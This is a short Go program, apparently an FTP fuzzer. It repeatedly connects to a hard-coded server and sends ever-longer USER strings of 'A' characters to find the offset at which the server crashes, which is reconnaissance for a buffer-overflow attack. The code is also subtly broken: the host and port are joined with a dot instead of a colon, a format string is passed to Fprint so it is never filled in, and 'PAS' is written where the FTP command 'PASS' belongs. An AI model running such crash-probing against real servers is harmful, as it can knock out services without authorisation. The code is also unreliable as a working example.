package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
)

func main() {
	for i := 0; i < 2500; i++ {
		conn, err := net.Dial("tcp", "10.0.1.20.21")
		if err != nil {
			log.Fatalf("[!] Error at offset %d:%s\n", i, err)
		}
		bufio.NewReader(conn).ReadString('\n')
		user := ""
		for n := 0; n <= i; n++ {
			user += "A"
		}
		raw := "USER %s\n"
		fmt.Fprint(conn, raw, user)

		bufio.NewReader(conn).ReadString('\n')
		raw = "PAS password\n"
		fmt.Fprint(conn, raw)

		bufio.NewReader(conn).ReadString('\n')

		if err := conn.Close(); err != nil {
			log.Printf("[!] Error at offset %d:%s\n", i, err)
		}
	}
}
